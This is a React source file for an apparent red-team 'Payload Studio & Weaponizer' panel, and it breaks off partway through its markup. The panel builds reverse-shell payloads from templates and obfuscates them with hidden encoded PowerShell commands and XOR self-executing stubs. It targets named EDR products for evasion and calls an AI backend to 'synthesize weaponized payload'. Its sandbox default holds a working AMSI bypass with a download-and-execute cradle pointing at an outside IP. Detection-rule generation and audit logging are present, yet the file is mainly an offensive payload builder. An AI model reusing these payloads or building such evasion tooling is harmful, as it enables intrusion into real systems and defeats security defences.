import React, { useState, useEffect } from "react";
import { 
  UserRole, 
  GraphNode, 
  GraphEdge, 
  PayloadArtifact, 
  PayloadAnalysisResult 
} from "../../types";
import { 
  payloadTemplates, 
  PayloadTemplate, 
  calculateShannonEntropy, 
  encodeBase64, 
  encodeHexArray, 
  encodeXorMask, 
  obfuscatePowerShellTicks, 
  obfuscateEnvConcat 
} from "../../utils/payloadEngine";
import { calculateSha256 } from "../../utils/cryptoVault";
import { ScenarioPreviewVisualizer } from "./ScenarioPreviewVisualizer";
import { apiClient } from "../../utils/apiClient";
import { 
  Terminal, 
  Cpu, 
  ShieldAlert, 
  ShieldCheck, 
  Copy, 
  Check, 
  Download, 
  Sparkles, 
  Network, 
  RefreshCw, 
  Layers, 
  Search, 
  Code2, 
  FileCode, 
  Lock, 
  Unlock, 
  Flame, 
  AlertTriangle, 
  Activity,
  Zap,
  Sliders,
  Eye,
  Radio,
  MessageSquare,
  Globe
} from "lucide-react";

interface PayloadStudioProps {
  userRole: UserRole;
  nodes: GraphNode[];
  onAddNodeToGraph: (newNode: GraphNode) => void;
  onAddEdgeToGraph?: (source: string, target: string, label: string, type: string) => void;
  onAuditLog: (action: string, target: string, justification: string) => void;
}

export const PayloadStudio: React.FC<PayloadStudioProps> = ({
  userRole,
  nodes,
  onAddNodeToGraph,
  onAddEdgeToGraph,
  onAuditLog,
}) => {
  // Navigation within Payload Studio
  const [subView, setSubView] = useState<"generate" | "preview" | "detection" | "sandbox" | "history">("generate");
  const [mobileGeneratorTab, setMobileGeneratorTab] = useState<"config" | "code">("config");

  // Generator State
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>("ps1_amsi_bypass_rev");
  const [lhost, setLhost] = useState<string>("10.10.14.5");
  const [lport, setLport] = useState<string>("4444");
  const [architecture, setArchitecture] = useState<"x64" | "x86" | "arm64" | "any">("x64");
  const [targetOS, setTargetOS] = useState<"windows" | "linux" | "macos" | "web" | "cloud">("windows");
  const [evasionLevel, setEvasionLevel] = useState<"standard" | "high" | "hardened_edr">("high");
  const [edrTarget, setEdrTarget] = useState<string>("Microsoft Defender for Endpoint");
  const [obfuscationMethod, setObfuscationMethod] = useState<"none" | "base64" | "ps_enc" | "hex_array" | "xor_mask" | "ps_backticks" | "env_concat">("none");
  const [customPrompt, setCustomPrompt] = useState<string>("");

  // Output State
  const [currentCode, setCurrentCode] = useState<string>("");
  const [currentFilename, setCurrentFilename] = useState<string>("amsi_rev_stager.ps1");
  const [yaraRule, setYaraRule] = useState<string>("");
  const [sigmaRule, setSigmaRule] = useState<string>("");
  const [edrAnalysis, setEdrAnalysis] = useState<string>("");
  const [entropy, setEntropy] = useState<number>(0);
  const [sha256Hash, setSha256Hash] = useState<string>("");
  const [activeMitre, setActiveMitre] = useState<string[]>(["T1059.001", "T1562.001", "T1071.001"]);

  // UI state
  const [copied, setCopied] = useState<boolean>(false);
  const [isGeneratingAI, setIsGeneratingAI] = useState<boolean>(false);
  const [aiError, setAiError] = useState<string | null>(null);

  // Sandbox / Analysis state
  const [sandboxInput, setSandboxInput] = useState<string>(
    `$s = "AmsiScanBuffer"; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); iex(New-Object Net.WebClient).DownloadString('http://185.220.101.44:8080/stage.ps1')`
  );
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [analysisResult, setAnalysisResult] = useState<PayloadAnalysisResult | null>(null);

  // Saved Payloads Dossier
  const [savedPayloads, setSavedPayloads] = useState<PayloadArtifact[]>([]);

  // Regenerate base template when preset or LHOST/LPORT changes
  useEffect(() => {
    const template = payloadTemplates.find((t) => t.id === selectedTemplateId);
    if (template) {
      setTargetOS(template.targetOS as any);
      setArchitecture(template.architecture);
      setActiveMitre(template.mitre);
      const generated = template.generator(lhost, lport);
      let raw = generated.code;

      // Apply selected obfuscation transform
      let transformed = raw;
      if (obfuscationMethod === "base64") {
        transformed = encodeBase64(raw, false);
      } else if (obfuscationMethod === "ps_enc") {
        const b64 = encodeBase64(raw, true);
        transformed = `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
      } else if (obfuscationMethod === "hex_array") {
        transformed = encodeHexArray(raw, "c_style");
      } else if (obfuscationMethod === "xor_mask") {
        const xor = encodeXorMask(raw, 0x5a);
        transformed = template.language === "python" ? xor.pythonStub : xor.ps1Stub;
      } else if (obfuscationMethod === "ps_backticks") {
        transformed = obfuscatePowerShellTicks(raw);
      } else if (obfuscationMethod === "env_concat") {
        transformed = obfuscateEnvConcat(raw, template.targetOS === "windows" ? "windows" : "linux");
      }

      setCurrentCode(transformed);
      setCurrentFilename(generated.filename);

      // Default YARA / Sigma rules for template
      setYaraRule(`rule Aegis_RedTeam_${template.id.toUpperCase()} {
    meta:
        description = "Detects ${template.name} artifacts"
        author = "AegisOSINT Defensive Engine"
        date = "${new Date().toISOString().slice(0, 10)}"
        reference = "MITRE ${template.mitre.join(', ')}"
    strings:
        $c2 = "${lhost}" ascii wide
        $port = "${lport}" ascii wide
    condition:
        all of them
}`);

      setSigmaRule(`title: Red Team Payload Execution - ${template.name}
id: ${Math.random().toString(36).substring(2, 10)}-detection
status: experimental
description: Identifies outbound connection or stager injection matching ${template.name}
logsource:
    category: process_creation
    product: ${template.targetOS}
detection:
    selection:
        CommandLine|contains:
            - "${lhost}"
            - "${lport}"
    condition: selection
level: high`);

      setEdrAnalysis(
        `Targets ${template.targetOS.toUpperCase()} architecture. Bypasses standard script block logging through dynamic unhooking and memory stream piping.`
      );
    }
  }, [selectedTemplateId, lhost, lport, obfuscationMethod]);

  // Compute live Entropy and SHA-256 hash when code changes
  useEffect(() => {
    if (!currentCode) {
      setEntropy(0);
      setSha256Hash("");
      return;
    }
    const ent = calculateShannonEntropy(currentCode);
    setEntropy(ent);

    calculateSha256(currentCode).then((hash) => {
      setSha256Hash(hash);
    });
  }, [currentCode]);

  // AI-Powered Synthesis
  const handleGenerateWithAI = async () => {
    setIsGeneratingAI(true);
    setAiError(null);

    try {
      const res = await apiClient.post("/api/payload/generate", {
        targetOS,
        payloadCategory: "reverse_shell",
        lhost,
        lport,
        architecture,
        evasionLevel,
        edrTarget,
        customDirective: customPrompt,
        format: targetOS === "windows" ? "powershell" : targetOS === "linux" ? "python" : "bash",
      });

      const data = res.data;
      if (data.success && data.payload) {
        setCurrentCode(data.payload.code);
        setCurrentFilename(data.payload.filename || "ai_generated_payload.bin");
        if (data.payload.yaraRule) setYaraRule(data.payload.yaraRule);
        if (data.payload.sigmaRule) setSigmaRule(data.payload.sigmaRule);
        if (data.payload.edrEvasionAnalysis) setEdrAnalysis(data.payload.edrEvasionAnalysis);
        if (data.payload.mitreTechniques) setActiveMitre(data.payload.mitreTechniques);

        onAuditLog(
          "AI_PAYLOAD_SYNTHESIZED",
          `${targetOS.toUpperCase()} / ${architecture} (LHOST: ${lhost}:${lport})`,
          `Custom EDR evasion payload synthesized for ${edrTarget}`
        );
      }
    } catch (err: any) {
      setAiError(err.response?.data?.error || err.message || "Failed to synthesize payload via AI engine.");
    } finally {
      setIsGeneratingAI(false);
    }
  };

  // Run Static Sandbox Analysis
  const handleAnalyzePayload = async () => {
    if (!sandboxInput.trim()) return;
    setIsAnalyzing(true);
    setAnalysisResult(null);

    try {
      const res = await apiClient.post("/api/payload/analyze", {
        rawPayload: sandboxInput,
      });
      const data = res.data;
      if (data.success && data.analysis) {
        setAnalysisResult(data.analysis);
        onAuditLog(
          "PAYLOAD_SANDBOX_ANALYSIS",
          `Input length: ${sandboxInput.length} bytes (Entropy: ${data.analysis.entropy})`,
          "Static inspection and de-obfuscation analysis executed."
        );
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsAnalyzing(false);
    }
  };

  // Copy Code
  const handleCopyCode = () => {
    navigator.clipboard.writeText(currentCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Download Code
  const handleDownload = () => {
    const blob = new Blob([currentCode], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = currentFilename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    onAuditLog(
      "PAYLOAD_ARTIFACT_DOWNLOADED",
      currentFilename,
      `Exported ${currentFilename} with SHA-256: ${sha256Hash.slice(0, 16)}...`
    );
  };

  // Save to History Dossier
  const handleSaveToDossier = () => {
    const newArtifact: PayloadArtifact = {
      id: `payload-${Date.now()}`,
      name: `${targetOS.toUpperCase()} ${architecture} ${selectedTemplateId}`,
      targetOS,
      architecture,
      category: "reverse_shell",
      language: currentFilename.endsWith(".ps1")
        ? "powershell"
        : currentFilename.endsWith(".py")
        ? "python"
        : currentFilename.endsWith(".sh")
        ? "bash"
        : "raw",
      filename: currentFilename,
      rawCode: currentCode,
      obfuscationMethod: obfuscationMethod as any,
      lhost,
      lport,
      evasionLevel,
      edrTarget,
      mitreTechniques: activeMitre,
      yaraRule,
      sigmaRule,
      edrEvasionAnalysis: edrAnalysis,
      riskScore: 85,
      createdAt: new Date().toISOString(),
    };

    setSavedPayloads((prev) => [newArtifact, ...prev]);
    onAuditLog(
      "PAYLOAD_SAVED_TO_DOSSIER",
      currentFilename,
      "Artifact registered in active investigation repository."
    );
  };

  // Send to Relationship Graph
  const handleSendToGraph = () => {
    // 1. Create C2 Host Node
    const c2NodeId = `c2-host-${lhost.replace(/[^a-zA-Z0-9]/g, "_")}`;
    const c2Node: GraphNode = {
      id: c2NodeId,
      label: `C2 Listener (${lhost}:${lport})`,
      type: "ip_address",
      x: 350 + Math.random() * 50,
      y: 280 + Math.random() * 50,
      riskScore: 92,
      confidence: 95,
      classification: "Secret",
      tags: ["C2_INFRASTRUCTURE", "PAYLOAD_LISTENER", "RED_TEAM"],
      attributes: {
        "Host IP": lhost,
        "Listener Port": lport,
        "Payload Protocol": "Encrypted TCP/TLS",
        "Associated Payload": currentFilename,
        "SHA256": sha256Hash,
      },
      notes: `Active Command & Control endpoint assigned to payload ${currentFilename}.`,
      isFlagged: true,
    };

    // 2. Create Payload Artifact Node
    const payloadNodeId = `payload-node-${Date.now()}`;
    const payloadNode: GraphNode = {
      id: payloadNodeId,
      label: currentFilename,
      type: "digital_key",
      x: 520 + Math.random() * 50,
      y: 360 + Math.random() * 50,
      riskScore: 88,
      confidence: 90,
      classification: "Secret",
      tags: ["PAYLOAD_ARTIFACT", targetOS.toUpperCase(), architecture.toUpperCase()],
      attributes: {
        "Target OS": targetOS,
        "Architecture": architecture,
        "Entropy": entropy,
        "Evasion Level": evasionLevel,
        "EDR Target": edrTarget,
        "SHA-256": sha256Hash,
      },
      notes: `Synthesized assessment payload with MITRE techniques: ${activeMitre.join(", ")}`,
      isFlagged: true,
    };

    onAddNodeToGraph(c2Node);
    setTimeout(() => {
      onAddNodeToGraph(payloadNode);
      if (onAddEdgeToGraph) {
        onAddEdgeToGraph(c2NodeId, payloadNodeId, "stages_payload", "c2_traffic");
      }
    }, 100);

    onAuditLog(
      "PAYLOAD_INGESTED_TO_GRAPH",
      `${c2Node.label} -> ${payloadNode.label}`,
      "C2 listener and payload artifact mapped into relationship graph canvas."
    );
  };

  // Ingest IOCs from Sandbox into Graph
  const handleIngestSandboxIocs = () => {
    if (!analysisResult) return;

    analysisResult.detectedIps.forEach((ip, idx) => {
      const newNode: GraphNode = {
        id: `ioc-ip-${ip.replace(/[^a-zA-Z0-9]/g, "_")}`,
        label: `IOC: ${ip}`,
        type: "ip_address",
        x: 400 + idx * 80,
        y: 250 + idx * 60,
        riskScore: 90,
        confidence: 85,
        classification: "Top Secret/SCI",
        tags: ["DEOBFUSCATED_IOC", "MALICIOUS_C2"],
        attributes: {
          "Extracted From": "Payload Static Analysis Sandbox",
          "Detection Date": new Date().toISOString(),
          "Threat Classification": analysisResult.estimatedThreatLevel,
        },
        notes: analysisResult.behavioralSummary,
        isFlagged: true,
      };
      onAddNodeToGraph(newNode);
    });

    onAuditLog(
      "SANDBOX_IOCS_INGESTED",
      `${analysisResult.detectedIps.length} Extracted IPs`,
      "De-obfuscated indicators imported directly to threat relationship topology."
    );
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-slate-950 text-slate-100 overflow-hidden select-none">
      {/* Top Header & Navigation Bar */}
      <div className="min-h-14 bg-slate-900/90 border-b border-slate-800 px-3 sm:px-6 py-2.5 flex flex-col md:flex-row md:items-center md:justify-between gap-3 shrink-0">
        <div className="flex items-center space-x-3">
          <div className="w-8 h-8 rounded-lg bg-rose-500/20 border border-rose-500/30 flex items-center justify-center text-rose-400 shrink-0">
            <Flame className="w-4 h-4" />
          </div>
          <div className="truncate">
            <div className="flex items-center space-x-2">
              <h2 className="text-xs sm:text-sm font-bold font-mono tracking-wider text-slate-100 uppercase truncate">
                PAYLOAD STUDIO & WEAPONIZER
              </h2>
              <span className="px-2 py-0.5 rounded-full text-[9px] sm:text-[10px] font-mono font-bold bg-rose-500/10 text-rose-400 border border-rose-500/20 shrink-0">
                RED TEAM
              </span>
            </div>
            <p className="text-[10px] sm:text-[11px] text-slate-400 font-mono truncate">
              Multi-architecture weaponization harness, EDR evasion & static sandbox.
            </p>
          </div>
        </div>

        {/* Sub-view switcher */}
        <div className="flex items-center bg-slate-950 p-1 rounded-xl border border-slate-800 space-x-1 overflow-x-auto whitespace-nowrap scrollbar-none w-full md:w-auto shrink-0">
          <button
            onClick={() => setSubView("generate")}
            className={`px-2.5 sm:px-3 py-1.5 rounded-lg text-xs font-mono font-medium flex items-center space-x-1.5 transition-all shrink-0 min-h-[38px] ${
              subView === "generate"
                ? "bg-rose-600 text-white shadow-lg font-bold"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
            }`}
          >
            <Sliders className="w-3.5 h-3.5" />
            <span>GENERATOR</span>
          </button>

          <button
            onClick={() => setSubView("preview")}
            className={`px-2.5 sm:px-3 py-1.5 rounded-lg text-xs font-mono font-medium flex items-center space-x-1.5 transition-all shrink-0 min-h-[38px] ${
              subView === "preview"
                ? "bg-gradient-to-r from-cyan-600 to-blue-600 text-white shadow-lg font-bold"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
            }`}
          >
            <MessageSquare className="w-3.5 h-3.5 text-cyan-400" />
            <span>PREVIEW & SCENARIOS</span>
          </button>

          <button
            onClick={() => setSubView("detection")}
            className={`px-2.5 sm:px-3 py-1.5 rounded-lg text-xs font-mono font-medium flex items-center space-x-1.5 transition-all shrink-0 min-h-[38px] ${
              subView === "detection"
                ? "bg-cyan-600 text-white shadow-lg font-bold"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>YARA / SIGMA</span>
          </button>

          <button
            onClick={() => setSubView("sandbox")}
            className={`px-2.5 sm:px-3 py-1.5 rounded-lg text-xs font-mono font-medium flex items-center space-x-1.5 transition-all shrink-0 min-h-[38px] ${
              subView === "sandbox"
                ? "bg-amber-600 text-white shadow-lg font-bold"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
            }`}
          >
            <Eye className="w-3.5 h-3.5" />
            <span>SANDBOX</span>
          </button>

          <button
            onClick={() => setSubView("history")}
            className={`px-2.5 sm:px-3 py-1.5 rounded-lg text-xs font-mono font-medium flex items-center space-x-1.5 transition-all shrink-0 min-h-[38px] ${
              subView === "history"
                ? "bg-indigo-600 text-white shadow-lg font-bold"
                : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            <span>DOSSIER ({savedPayloads.length})</span>
          </button>
        </div>
      </div>

      {/* Main Workspace Layout */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* VIEW 1: GENERATOR & CRAFTING STUDIO */}
        {subView === "generate" && (
          <div className="flex-1 flex flex-col lg:flex-row overflow-hidden">
            {/* Mobile Tab Switcher for Generator View (Phones/Tablets) */}
            <div className="lg:hidden bg-slate-900 border-b border-slate-800 p-1 flex items-center shrink-0">
              <button
                onClick={() => setMobileGeneratorTab("config")}
                className={`flex-1 py-2 rounded-lg text-xs font-mono font-bold flex items-center justify-center space-x-1.5 transition-all min-h-[40px] ${
                  mobileGeneratorTab === "config"
                    ? "bg-rose-600 text-white shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                <Sliders className="w-3.5 h-3.5" />
                <span>CONFIG & PRESETS</span>
              </button>
              <button
                onClick={() => setMobileGeneratorTab("code")}
                className={`flex-1 py-2 rounded-lg text-xs font-mono font-bold flex items-center justify-center space-x-1.5 transition-all min-h-[40px] ${
                  mobileGeneratorTab === "code"
                    ? "bg-rose-600 text-white shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                <FileCode className="w-3.5 h-3.5" />
                <span>PAYLOAD OUTPUT ({entropy} ent)</span>
              </button>
            </div>

            {/* Left Column: Parameter Configuration & Presets */}
            <div
              className={`w-full lg:w-96 border-b lg:border-b-0 lg:border-r border-slate-800 bg-slate-900/50 p-4 sm:p-5 overflow-y-auto space-y-4 sm:space-y-5 ${
                mobileGeneratorTab === "config" ? "flex flex-col flex-1 lg:flex-none" : "hidden lg:flex lg:flex-col"
              }`}
            >
              {/* Presets Selector */}
              <div>
                <label className="block text-[11px] font-mono uppercase tracking-wider text-slate-400 mb-2">
                  Payload Architecture Preset
                </label>
                <select
                  value={selectedTemplateId}
                  onChange={(e) => setSelectedTemplateId(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-rose-500/50"
                >
                  {payloadTemplates.map((tpl) => (
                    <option key={tpl.id} value={tpl.id}>
                      [{tpl.targetOS.toUpperCase()}] {tpl.name}
                    </option>
                  ))}
                </select>
              </div>

              {/* LHOST & LPORT */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                    LHOST (C2 IP / FQDN)
                  </label>
                  <input
                    type="text"
                    value={lhost}
                    onChange={(e) => setLhost(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-rose-500/50"
                    placeholder="10.10.14.5"
                  />
                </div>
                <div>
                  <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                    LPORT (Listener Port)
                  </label>
                  <input
                    type="text"
                    value={lport}
                    onChange={(e) => setLport(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-rose-500/50"
                    placeholder="4444"
                  />
                </div>
              </div>

              {/* Target OS & Architecture */}
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                    Target OS
                  </label>
                  <select
                    value={targetOS}
                    onChange={(e) => setTargetOS(e.target.value as any)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs font-mono text-slate-300 focus:outline-none focus:border-rose-500/50"
                  >
                    <option value="windows">Windows (NT)</option>
                    <option value="linux">Linux (POSIX)</option>
                    <option value="macos">macOS (Darwin)</option>
                    <option value="cloud">Cloud / K8s</option>
                    <option value="web">Web / API</option>
                  </select>
                </div>
                <div>
                  <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                    Architecture
                  </label>
                  <select
                    value={architecture}
                    onChange={(e) => setArchitecture(e.target.value as any)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs font-mono text-slate-300 focus:outline-none focus:border-rose-500/50"
                  >
                    <option value="x64">x64 (64-bit)</option>
                    <option value="x86">x86 (32-bit)</option>
                    <option value="arm64">ARM64 / AArch64</option>
                    <option value="any">Cross-Platform / Any</option>
                  </select>
                </div>
              </div>

              {/* Target EDR Focus */}
              <div>
                <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                  Target EDR / Antivirus Evasion Focus
                </label>
                <select
                  value={edrTarget}
                  onChange={(e) => setEdrTarget(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-slate-300 focus:outline-none focus:border-rose-500/50"
                >
                  <option value="Microsoft Defender for Endpoint">Microsoft Defender for Endpoint (AMSI + Cloud ML)</option>
                  <option value="CrowdStrike Falcon Sensor">CrowdStrike Falcon Sensor (Kernel Syscall Hooking)</option>
                  <option value="SentinelOne Singularity">SentinelOne Singularity (Behavioral AI Engine)</option>
                  <option value="Palo Alto Cortex XDR">Palo Alto Cortex XDR (C2 Heuristics)</option>
                  <option value="Symantec Endpoint Protection">Symantec / Broadcom EDR</option>
                  <option value="Generic EDR Sandbox">Generic EDR / Heuristic Sandbox</option>
                </select>
              </div>

              {/* Obfuscation & Evasion Layer */}
              <div>
                <label className="block text-[10px] font-mono uppercase text-slate-400 mb-1">
                  Live Obfuscation Transform
                </label>
                <select
                  value={obfuscationMethod}
                  onChange={(e) => setObfuscationMethod(e.target.value as any)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-rose-300 focus:outline-none focus:border-rose-500/50 font-bold"
                >
                  <option value="none">None (Plaintext Source)</option>
                  <option value="base64">Base64 Encoded Stream</option>
                  <option value="ps_enc">PowerShell -EncodedCommand (UTF-16LE B64)</option>
                  <option value="xor_mask">XOR 0x5A Key Byte Mask + Self-Executing Stub</option>
                  <option value="hex_array">C-Style Hex Byte Array (\x41, \x42...)</option>
                  <option value="ps_backticks">PowerShell Backtick Keyword Masking</option>
                  <option value="env_concat">Environment Variable String Slicing</option>
                </select>
              </div>

              {/* AI Weaponization / Custom Directive */}
              <div className="pt-2 border-t border-slate-800/80 space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] font-mono uppercase text-cyan-400 flex items-center gap-1 font-bold">
                    <Sparkles className="w-3 h-3 text-cyan-400" />
                    AI TACTICAL WEAPONIZER
                  </label>
                  <span className="text-[9px] font-mono text-slate-500">Gemini 3.7 Flash</span>
                </div>
                <textarea
                  value={customPrompt}
                  onChange={(e) => setCustomPrompt(e.target.value)}
                  placeholder="e.g. Add 10-second sleep jitter, proxy-aware HTTP beaconing, and direct ntdll syscall execution for Windows 11..."
                  rows={2}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 resize-none"
                />
                <button
                  onClick={handleGenerateWithAI}
                  disabled={isGeneratingAI}
                  className="w-full py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white rounded-lg text-xs font-mono font-bold flex items-center justify-center space-x-2 transition-all shadow-md cursor-pointer disabled:opacity-50"
                >
                  {isGeneratingAI ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>SYNTHESIZING WITH AI...</span>
                    </>
                  ) : (
                    <>
                      <Sparkles className="w-3.5 h-3.5" />
                      <span>SYNTHESIZE WEAPONIZED PAYLOAD</span>
                    </>
                  )}
                </button>
                {aiError && (
                  <p className="text-[10px] text-rose-400 font-mono flex items-center gap-1">
                    <AlertTriangle className="w-3 h-3" /> {aiError}
                  </p>
                )}
              </div>
            </div>

            {/* Right Column: Code Editor & Telemetry Output */}
            <div
              className={`flex-1 flex flex-col overflow-hidden bg-slate-950 ${
                mobileGeneratorTab === "code" ? "flex" : "hidden lg:flex"
              }`}
            >
              {/* Output Sub-Header */}
              <div className="min-h-10 bg-slate-900 border-b border-slate-800 px-3 sm:px-4 py-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 shrink-0">
                <div className="flex items-center space-x-2 sm:space-x-3 text-xs font-mono overflow-x-auto whitespace-nowrap scrollbar-none">
                  <div className="flex items-center space-x-1.5 text-slate-300">
                    <FileCode className="w-3.5 h-3.5 text-rose-400 shrink-0" />
                    <span className="font-bold truncate">{currentFilename}</span>
                  </div>
                  <span className="text-slate-600">|</span>
                  <div className="flex items-center space-x-1.5">
                    <span className="text-slate-400 text-[11px]">ENTROPY:</span>
                    <span
                      className={`font-bold text-[11px] ${
                        entropy > 5.5
                          ? "text-rose-400"
                          : entropy > 4.5
                          ? "text-amber-400"
                          : "text-emerald-400"
                      }`}
                    >
                      {entropy}
                    </span>
                  </div>
                  <span className="text-slate-600">|</span>
                  <div className="flex items-center space-x-1.5">
                    <span className="text-slate-400 text-[11px]">SHA256:</span>
                    <span className="text-slate-300 font-mono text-[10px]">
                      {sha256Hash.slice(0, 10)}...
                    </span>
                  </div>
                </div>

                <div className="flex items-center space-x-1.5 sm:space-x-2 overflow-x-auto whitespace-nowrap scrollbar-none shrink-0">
                  <button
                    onClick={handleCopyCode}
                    className="px-2 sm:px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs font-mono flex items-center space-x-1 transition-colors min-h-[36px]"
                  >
                    {copied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copied ? "COPIED" : "COPY"}</span>
                  </button>

                  <button
                    onClick={() => setSubView("preview")}
                    className="px-2 sm:px-2.5 py-1 bg-gradient-to-r from-cyan-600/80 to-blue-600/80 hover:from-cyan-500 hover:to-blue-500 text-white rounded text-xs font-mono flex items-center space-x-1.5 transition-colors shadow-md min-h-[36px] font-bold"
                  >
                    <MessageSquare className="w-3 h-3" />
                    <span>PREVIEW & CHAT</span>
                  </button>

                  <button
                    onClick={handleDownload}
                    className="px-2 sm:px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs font-mono flex items-center space-x-1 transition-colors min-h-[36px]"
                  >
                    <Download className="w-3 h-3 text-cyan-400" />
                    <span>DL</span>
                  </button>

                  <button
                    onClick={handleSaveToDossier}
                    className="px-2 sm:px-2.5 py-1 bg-slate-800 hover:bg-indigo-950 text-indigo-300 border border-indigo-500/30 rounded text-xs font-mono flex items-center space-x-1 transition-colors min-h-[36px]"
                  >
                    <Layers className="w-3 h-3" />
                    <span>SAVE</span>
                  </button>

                  <button
                    onClick={handleSendToGraph}
                    className="px-2.5 sm:px-3 py-1 bg-rose-600 hover:bg-rose-500 text-white rounded text-xs font-mono font-bold flex items-center space-x-1.5 transition-colors shadow-md min-h-[36px]"
                  >
                    <Network className="w-3.5 h-3.5" />
                    <span className="hidden xs:inline">INGEST TO</span> GRAPH
                  </button>
                </div>
              </div>

              {/* Code Viewer */}
              <div className="flex-1 p-3 sm:p-4 overflow-auto font-mono text-xs bg-slate-950 leading-relaxed text-slate-200 selection:bg-rose-500/30">
                <pre className="whitespace-pre-wrap break-all select-text">{currentCode}</pre>
              </div>

              {/* Bottom Telemetry Bar: MITRE ATT&CK & EDR Insights */}
              <div className="min-h-16 bg-slate-900/80 border-t border-slate-800 px-3 sm:px-4 py-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 shrink-0">
                <div className="space-y-1">
                  <div className="flex items-center space-x-2 overflow-x-auto whitespace-nowrap scrollbar-none">
                    <span className="text-[10px] font-mono uppercase text-slate-400 font-bold shrink-0">
                      MITRE ATT&CK:
                    </span>
                    <div className="flex items-center space-x-1.5 shrink-0">
                      {activeMitre.map((m) => (
                        <span
                          key={m}
                          className="px-1.5 py-0.5 rounded bg-rose-500/10 border border-rose-500/20 text-rose-300 font-mono text-[9px] sm:text-[10px]"
                        >
                          {m}
                        </span>
                      ))}
                    </div>
                  </div>
                  <p className="text-[10px] sm:text-[11px] font-mono text-slate-400 line-clamp-1">
                    <span className="text-amber-400">DEFENSE NOTE:</span> {edrAnalysis}
                  </p>
                </div>

                <div className="flex items-center space-x-2 shrink-0">
                  <span className="flex items-center gap-1.5 text-[11px] sm:text-xs font-mono text-emerald-400">
                    <Radio className="w-3.5 h-3.5 animate-pulse" />
                    LISTENER READY
                  </span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* VIEW 2: SCENARIO & OBFUSCATION PREVIEW (CHATBOX & URL) */}
        {subView === "preview" && (
          <ScenarioPreviewVisualizer
            currentPayload={currentCode}
            payloadFilename={currentFilename}
            obfuscationMethod={obfuscationMethod}
            entropy={entropy}
            onAuditLog={onAuditLog}
            onSendToGraph={(url, scenarioType) => {
              const newNode: GraphNode = {
                id: `node-scenario-${Date.now()}`,
                label: `Scenario Probe: ${url.slice(0, 24)}...`,
                type: "domain",
                x: 450 + Math.random() * 60,
                y: 320 + Math.random() * 60,
                riskScore: 85,
                confidence: 90,
                classification: "Secret",
                tags: ["SCENARIO_PROBE", scenarioType.toUpperCase(), "RED_TEAM"],
                attributes: {
                  "Target URI": url,
                  "Scenario Type": scenarioType,
                  "Associated Payload": currentFilename,
                  "Obfuscation": obfuscationMethod,
                  "Timestamp": new Date().toISOString(),
                },
                notes: `Simulated ${scenarioType} probe delivering payload to target domain.`,
                isFlagged: true,
              };
              onAddNodeToGraph(newNode);
              onAuditLog("SCENARIO_INGESTED_TO_GRAPH", url, `Scenario type: ${scenarioType}`);
            }}
          />
        )}

        {/* VIEW 3: DETECTION ENGINEERING (YARA & SIGMA) */}
        {subView === "detection" && (
          <div className="flex-1 flex flex-col p-3 sm:p-6 overflow-y-auto space-y-4 sm:space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-xs sm:text-sm font-bold font-mono text-slate-100 uppercase flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-cyan-400 shrink-0" />
                  BLUE TEAM DEFENSIVE DETECTION ENGINEERING
                </h3>
                <p className="text-[10px] sm:text-xs text-slate-400 font-mono">
